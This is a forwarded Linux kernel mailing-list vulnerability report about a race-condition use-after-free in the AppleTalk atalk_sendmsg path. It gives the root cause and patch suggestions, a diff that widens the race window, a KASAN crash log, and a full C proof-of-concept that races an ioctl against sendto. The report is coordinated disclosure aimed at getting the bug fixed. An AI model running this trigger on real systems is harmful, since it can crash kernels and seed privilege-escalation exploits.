Return-Path: <netdev+bounces-38744-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id 78CD57BC509
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:37:28 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 2C25E282103
	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:37:27 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id ABD65746B;
	Sat,  7 Oct 2023 06:37:25 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; dkim=none
X-Original-To: netdev@vger.kernel.org
Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7A87979C1
	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:37:23 +0000 (UTC)
Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 88356EA
	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:37:19 -0700 (PDT)
Received: (from willy@localhost)
	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976bFRQ021174;
	Sat, 7 Oct 2023 08:37:15 +0200
Date: Sat, 7 Oct 2023 08:37:15 +0200
From: Willy Tarreau <w@1wt.eu>
To: netdev@vger.kernel.org
Cc: rootlab@huawei.com
Subject: Fwd: Race Condition Vulnerability in atalk_sendmsg of nfc module
 leading to UAF
Message-ID: <20231007063715.GU20998@1wt.eu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,
	RCVD_IN_DNSWL_BLOCKED,SPF_HELO_PASS,SPF_PASS autolearn=ham
	autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
	lindbergh.monkeyblade.net

Hello,

Sili Luo of Huawei sent this to the security list. Eric and I think it
does not deserve special handling from the security team and will be
better addressed here.

Regards,
Willy

PS: there are 6 reports for atalk in this series.

----- Forwarded message from rootlab <rootlab@huawei.com> -----

> Date: Sat, 7 Oct 2023 03:10:52 +0000
> From: rootlab <rootlab@huawei.com>
> Subject: Race Condition Vulnerability in atalk_sendmsg of nfc module leading to UAF
> To: "security@kernel.org" <security@kernel.org>
> Delivered-To: security@kernel.org
> 
> I recently found an race condition Vulnerability in the atalk_sendmsg, which leads to the kernel access free'd atalk_route object.
> 
> The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
> 
> [Root Cause]
> 
>   *   atalk_sendmsg
> 
>      *   lock_sock(sk);
>      *   struct atalk_route *rt = atrtr_find(&usat->sat_addr);
>      *   dev = rt->dev;
>      *   release_sock(sk);
> 
> key logic of code:
> 
>   1.  atalk_sendmsg first obtain the lock of sk
>   2.  then it call atrtr_find to search rt
>   3.  then it will use rt
> 
> rt can be free through ioctl(at_fd, SIOCDIFADDR, &atreq);.
> 
> atalk_ioctl
> 
>   *   rtnl_lock();
> 
>      *   SIOCDIFADDR
> 
>         *   atalk_dev_down
> 
>            *   atrtr_device_down
> 
>               *   kfree(tmp);
>   *   rtnl_unlock();
> 
> During the atalk_ioctl --> atrtr_device_down process, only the rtnl lock is obtained.
> 
> Inconsistency between the rtnl lock and the atalk_sendmsg lock causes UAF.
> 
>                                      Time
>                                       +
> thread A                              |   Thread B
> atalk_sendmsg                         |   atalk_dev_down
>                                       |
>     lock_sock(sk);                    |
>                                       |
>   1.rt = atrtr_find(&usat->sat_addr)  |
>                                       |
>                                       |
>                                       |    2.atrtr_device_down(dev)---> kfree(rt)
>                                       |
>                                       |
>                                       |
>   3.dev = rt->dev --> UAF!            |
>                                       +
> 
> 
> [Patch Suggestion]
> 
>   1.  add refcount for struct atalk_route
>   2.  Use the right lock
> 
> [Proof-of-Concept]
> 
> The POC is at the end of the email.
> 
> Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
> 
> To increase the probability of race, I add some loops to the race part of the code ( atalk_find_anynet ) to increase the time window.
> 
> the dxxx() function just do some loop to increase the time window.
> 
> From aadcbd89dee5f000382628e1a6e7294aaef412c7 Mon Sep 17 00:00:00 2001
> From: luosili <rootlab@huawei.com>
> Date: Wed, 27 Sep 2023 17:36:09 +0800
> Subject: [PATCH] appletalk: patch for race in atalk_sendmsg
> 
> add some loops in the race code.
> 
> Signed-off-by: luosili <rootlab@huawei.com>
> ---
>  net/appletalk/ddp.c | 16 ++++++++++++++++
>  1 file changed, 16 insertions(+)
> 
> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
> index 8978fb6212ff..482e684a0e17 100644
> --- a/net/appletalk/ddp.c
> +++ b/net/appletalk/ddp.c
> @@ -1566,6 +1566,19 @@ static int ltalk_rcv(struct sk_buff *skb, struct net_device *dev,
>         return 0;
>  }
> 
> +#pragma GCC push_options
> +#pragma GCC optimize ("O0")
> +noinline u64 dxxx(void)
> +{
> +       u64 xxx = 0;
> +       for (size_t i = 0; i < 100000000; i++) {
> +               xxx *= 0x241;
> +               xxx += 0x1234;
> +       }
> +       return xxx;
> +}
> +#pragma GCC pop_options
> +
>  static int atalk_sendmsg(struct socket *sock, struct msghdr *msg, size_t len)
>  {
>         struct sock *sk = sock->sk;
> @@ -1636,6 +1649,9 @@ static int atalk_sendmsg(struct socket *sock, struct msghdr *msg, size_t len)
>         if (!rt)
>                 goto out;
> 
> +       printk("vuln: [atalk_sendmsg] %llx\n", (uint64_t)rt);
> +       dxxx();
> +       printk("vuln: [atalk_sendmsg] do use %llx\n", (uint64_t)rt);
>         dev = rt->dev;
> 
>         SOCK_DEBUG(sk, "SK %p: Size needed %d, device %s\n",
> --
> 2.25.1
> 
> 
> 
> panic log
> 
> 
> # /tmp/atalk_sendmsg
> fd: 3
> [  108.646077] vuln: [atalk_sendmsg] ffff88800a1e18c0
> [  109.078904] vuln: [atalk_sendmsg] do use ffff88800a1e18c0
> [  109.079334] ==================================================================
> [  109.079838] BUG: KASAN: slab-use-after-free in atalk_sendmsg+0x328/0xc60 [appletalk]
> [  109.080436] Read of size 8 at addr ffff88800a1e18c0 by task atalk_sendmsg/172
> [  109.080921]
> [  109.081042] CPU: 1 PID: 172 Comm: atalk_sendmsg Tainted: G           OE      6.5.0-rc5 #7
> [  109.081607] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
> [  109.082222] Call Trace:
> [  109.082405]  <TASK>
> [  109.082562]  dump_stack_lvl+0x4c/0x70
> [  109.082842]  print_report+0xd3/0x620
> [  109.083112]  ? kasan_complete_mode_report_info+0x7d/0x200
> [  109.083481]  ? atalk_sendmsg+0x328/0xc60 [appletalk]
> [  109.083836]  kasan_report+0xc2/0x100
> [  109.084089]  ? atalk_sendmsg+0x328/0xc60 [appletalk]
> [  109.084450]  __asan_load8+0x82/0xb0
> [  109.084699]  atalk_sendmsg+0x328/0xc60 [appletalk]
> [  109.085046]  ? __call_rcu_common.constprop.0+0x1e9/0x3a0
> [  109.085436]  ? aa_sk_perm+0x183/0x3b0
> [  109.085705]  ? __pfx_atalk_sendmsg+0x10/0x10 [appletalk]
> [  109.086084]  ? call_rcu+0x12/0x20
> [  109.086316]  ? __rcu_read_unlock+0x5b/0x280
> [  109.086606]  ? apparmor_socket_sendmsg+0x2f/0x40
> [  109.086931]  ? __pfx_atalk_sendmsg+0x10/0x10 [appletalk]
> [  109.087307]  sock_sendmsg+0xef/0x100
> [  109.087575]  ? move_addr_to_kernel.part.0+0x4f/0x90
> [  109.088064]  __sys_sendto+0x1bd/0x270
> [  109.088456]  ? __pfx___sys_sendto+0x10/0x10
> [  109.088841]  ? blkcg_maybe_throttle_current+0x92/0x520
> [  109.089292]  ? mem_cgroup_handle_over_high+0x8b/0x3b0
> [  109.089704]  ? __pfx_blkcg_maybe_throttle_current+0x10/0x10
> [  109.090108]  ? __pfx_mem_cgroup_handle_over_high+0x10/0x10
> [  109.090514]  ? __kasan_check_write+0x18/0x20
> [  109.090842]  ? __kasan_check_read+0x15/0x20
> [  109.091212]  __x64_sys_sendto+0x84/0xa0
> [  109.091546]  do_syscall_64+0x60/0x90
> [  109.091808]  ? do_syscall_64+0x6d/0x90
> [  109.092073]  ? do_syscall_64+0x6d/0x90
> [  109.092335]  ? syscall_exit_to_user_mode+0x2a/0x50
> [  109.092668]  ? do_syscall_64+0x6d/0x90
> [  109.092934]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [  109.093297] RIP: 0033:0x406cd4
> [  109.093532] Code: f2 fc ff ff 44 8b 4c 24 2c 4c 8b 44 24 20 89 c5 44 8b 54 24 28 48 8b 54 24 18 b8 2c 00 00 00 48 8b 74 24 10 8b 7c 24 08 0f 05 <48> 3d 00 f0 ff ff 77 30 89 ef 48 89 44 24 08 e8 18 fd ff ff 48 8b
> [  109.094787] RSP: 002b:00007f4842f7c6e0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
> [  109.095314] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000406cd4
> [  109.095823] RDX: 0000000000000012 RSI: 00007f4842f7c7a0 RDI: 0000000000000004
> [  109.096477] RBP: 0000000000000000 R08: 00007f4842f7c770 R09: 0000000000000014
> [  109.097139] R10: 0000000000000000 R11: 0000000000000293 R12: 00007ffc1476936e
> [  109.097797] R13: 00007ffc1476936f R14: 00007ffc14769370 R15: 00007f4842f7ce80
> [  109.098472]  </TASK>
> [  109.098690]
> [  109.098851] Allocated by task 170:
> [  109.099231]  kasan_save_stack+0x2a/0x50
> [  109.099603]  kasan_set_track+0x29/0x40
> [  109.099965]  kasan_save_alloc_info+0x1f/0x30
> [  109.100380]  __kasan_kmalloc+0xb5/0xc0
> [  109.100735]  kmalloc_trace+0x4e/0xb0
> [  109.101132]  atrtr_create+0x29a/0x450 [appletalk]
> [  109.101691]  atif_ioctl+0x45c/0x6c0 [appletalk]
> [  109.102166]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [  109.102606]  sock_do_ioctl+0xb9/0x1a0
> [  109.102960]  sock_ioctl+0x1b1/0x420
> [  109.103281]  __x64_sys_ioctl+0xd1/0x110
> [  109.103661]  do_syscall_64+0x60/0x90
> [  109.104013]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [  109.104490]
> [  109.104667] Freed by task 171:
> [  109.104976]  kasan_save_stack+0x2a/0x50
> [  109.105440]  kasan_set_track+0x29/0x40
> [  109.105818]  kasan_save_free_info+0x2f/0x50
> [  109.106202]  __kasan_slab_free+0x12e/0x1c0
> [  109.106617]  __kmem_cache_free+0x1b9/0x380
> [  109.107031]  kfree+0x7a/0x120
> [  109.107344]  atrtr_device_down+0xab/0x120 [appletalk]
> [  109.107830]  atif_ioctl+0x1db/0x6c0 [appletalk]
> [  109.108267]  atalk_ioctl+0x124/0x1e0 [appletalk]
> [  109.108720]  sock_do_ioctl+0xb9/0x1a0
> [  109.109093]  sock_ioctl+0x1b1/0x420
> [  109.109520]  __x64_sys_ioctl+0xd1/0x110
> [  109.109994]  do_syscall_64+0x60/0x90
> [  109.110423]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
> [  109.111015]
> [  109.111221] The buggy address belongs to the object at ffff88800a1e18c0
> [  109.111221]  which belongs to the cache kmalloc-32 of size 32
> [  109.112741] The buggy address is located 0 bytes inside of
> [  109.112741]  freed 32-byte region [ffff88800a1e18c0, ffff88800a1e18e0)
> [  109.113585]
> [  109.113697] The buggy address belongs to the physical page:
> [  109.114085] page:00000000c052536e refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xa1e1
> [  109.114715] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
> [  109.115189] page_type: 0xffffffff()
> [  109.115436] raw: 000fffffc0000200 ffff888006842500 dead000000000122 0000000000000000
> [  109.115959] raw: 0000000000000000 0000000080400040 00000001ffffffff 0000000000000000
> [  109.116614] page dumped because: kasan: bad access detected
> [  109.117149]
> [  109.117305] Memory state around the buggy address:
> [  109.117746]  ffff88800a1e1780: fa fb fb fb fc fc fc fc fc fc fc fc fc fc fc fc
> [  109.118396]  ffff88800a1e1800: fc fc fc fc fc fc fc fc fa fb fb fb fc fc fc fc
> [  109.119036] >ffff88800a1e1880: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
> [  109.119692]                                            ^
> [  109.120180]  ffff88800a1e1900: fc fc fc fc fc fc fc fc fa fb fb fb fc fc fc fc
> [  109.120838]  ffff88800a1e1980: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
> [  109.121502] ==================================================================
> [  109.122201] Disabling lock debugging due to kernel taint
> Packet sent successfully.
> 
> 
> 
> [CREDIT]
> 
> Sili Luo
> RO0T Lab of Huawei
> 
> poc
> 
> #define _GNU_SOURCE
> #include <errno.h>
> #include <fcntl.h>
> #include <linux/if_tun.h>
> #include <linux/atalk.h>
> #include <net/if.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdio.h>
> #include <string.h>
> #include <sys/ioctl.h>
> #include <sys/socket.h>
> #include <sys/stat.h>
> #include <sys/types.h>
> #include <time.h>
> #include <unistd.h>
> 
> #include <net/route.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <linux/if_ether.h>
> #include <linux/if_packet.h>
> #include <linux/if_x25.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> #include <unistd.h>
> 
> #include <arpa/inet.h>
> #include <linux/if_packet.h>
> #include <net/ethernet.h>
> #include <netinet/if_ether.h>
> #include <netinet/in.h>
> #include <netinet/ip.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/socket.h>
> 
> 
> void pincpu(int cpu) {
>   cpu_set_t set;
>   CPU_ZERO(&set);
>   CPU_SET(cpu, &set);
>   if (sched_setaffinity(0, sizeof(cpu_set_t), &set) < 0) {
>     perror("setaffinity");
>   }
> }
> 
> int at_fd;
> 
> #define THREAD_NUMS 2
> pthread_barrier_t barrier;
> 
> void free_thread() {
>   pincpu(0);
> 
>   srand(time(NULL));
> 
> 
>   usleep(15000);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCDIFADDR, &atreq);
> }
> 
> void use_thread() {
>   pincpu(1);
> 
>   send_pkt2();
>   puts("use done");
> }
> 
> #define ETH_P_X25 0x0805
> 
> int send_pkt2() {
> 
> 
> 
>   int sockfd;
>   struct sockaddr_ll sa;
>   struct ether_header eth_header;
>   struct iphdr ip_header;
>   char packet[ETH_FRAME_LEN];
>   char *interface = "eth0"; // Replace with your desired interface name
> 
>   // Create socket
>   sockfd = socket(PF_APPLETALK, SOCK_RAW, htons(ETH_P_ATALK));
>   if (sockfd == -1) {
>     perror("socket");
>     return 1;
>   }
> 
>   // Set interface index
>   memset(&sa, 0, sizeof(struct sockaddr_ll));
>   sa.sll_family = PF_APPLETALK;
>   sa.sll_protocol = htons(ETH_P_ATALK);
>   sa.sll_ifindex = if_nametoindex(interface);
> 
>   struct sockaddr_at ssa = {0};
> 
>   ssa.sat_addr.s_node = 0;
>   ssa.sat_addr.s_net = 0;
>   ssa.sat_family = PF_APPLETALK;
> 
>   // Set Ethernet header
>   memset(&eth_header, 0, sizeof(struct ether_header));
>   eth_header.ether_shost[0] = 0x00; // Source MAC address
>   eth_header.ether_shost[1] = 0x11;
>   eth_header.ether_shost[2] = 0x22;
>   eth_header.ether_shost[3] = 0x33;
>   eth_header.ether_shost[4] = 0x44;
>   eth_header.ether_shost[5] = 0x55;
>   eth_header.ether_dhost[0] = 0x66; // Destination MAC address
>   eth_header.ether_dhost[1] = 0x77;
>   eth_header.ether_dhost[2] = 0x88;
>   eth_header.ether_dhost[3] = 0x99;
>   eth_header.ether_dhost[4] = 0xAA;
>   eth_header.ether_dhost[5] = 0xBB;
>   eth_header.ether_type = htons(ETH_P_ATALK);
> 
>   // Set IP header
>   memset(&ip_header, 0x22, sizeof(struct iphdr));
> 
>   memcpy(packet, &eth_header, sizeof(struct ether_header));
> 
>   uint8_t *ptr = packet + sizeof(struct ether_header);
> 
>   *(uint64_t *)ptr = 0x11223344;
> 
>   // Send the packet
>   if (sendto(sockfd, packet, sizeof(struct ether_header) + 4, 0,
>              (struct sockaddr *)&ssa, sizeof(struct sockaddr_ll)) == -1) {
>     perror("sendto");
>     return 1;
>   }
> 
>   printf("Packet sent successfully.\n");
> 
>   // Close the socket
>   close(sockfd);
> 
>   return 0;
> }
> 
> int main() {
> 
>   at_fd = socket(PF_APPLETALK, SOCK_DGRAM, 0);
>   printf("fd: %d\n", at_fd);
> 
>   struct ifreq atreq;
>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
> 
>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
> 
>   sa->sat_family = AF_APPLETALK;
>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
>   nr->nr_phase = 2;
>   sa->sat_addr.s_node = 3;
>   sa->sat_addr.s_net = 12;
> 
>   ioctl(at_fd, SIOCSIFADDR, &atreq);
> 
> 
>   struct rtentry rt = {0};
>   char name[] = "lo";
>   rt.rt_dev = NULL;
> 
>         struct sockaddr_at *ta = (struct sockaddr_at *)&rt.rt_dst;
>         struct sockaddr_at *ga = (struct sockaddr_at *)&rt.rt_gateway;
>   ta->sat_family = AF_APPLETALK;
>   ga->sat_family = AF_APPLETALK;
>   ta->sat_addr.s_net = 0x43;
>   ta->sat_addr.s_node = 0x42;
>   ga->sat_addr = sa->sat_addr;
>   ioctl(at_fd, SIOCADDRT, &rt);
> 
> 
> 
>   // getchar();
> 
>   // return;
> 
>   pthread_barrier_init(&barrier, NULL, THREAD_NUMS);
> 
>   pthread_t ids[2] = {0};
>   pthread_create(&ids[0], NULL, (void *)free_thread, NULL);
>   pthread_create(&ids[1], NULL, (void *)use_thread, NULL);
> 
>   pthread_join(ids[0], NULL);
>   pthread_join(ids[1], NULL);
> 
>   sleep(1);
> }
> 
> 

----- End forwarded message -----

